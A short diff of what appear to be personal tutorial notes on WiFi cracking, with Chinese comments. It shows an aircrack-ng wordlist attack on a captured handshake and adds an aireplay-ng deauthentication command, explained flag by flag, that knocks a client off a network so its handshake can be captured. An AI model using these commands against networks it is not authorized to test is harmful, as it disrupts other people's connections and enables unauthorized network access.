@@ -15,3 +15,8 @@ aircrack-ng -w /root/mima.lst /root/wlan0mon.cap-01.cap
 
 #stop mon mode:
   airmon-ng stop wlan0mon
+
+
+aireplay-ng -0 3 -a  该wifi的bssid   -c 连接该wifi的用户设备station  wlan0mon  （图5右侧）
+
+#(-0表示发送解除认证,让该设备重新连接以获取认证包，3表示发送3次，当该数为0时表示无限次，-a表示access point,-c表示client)
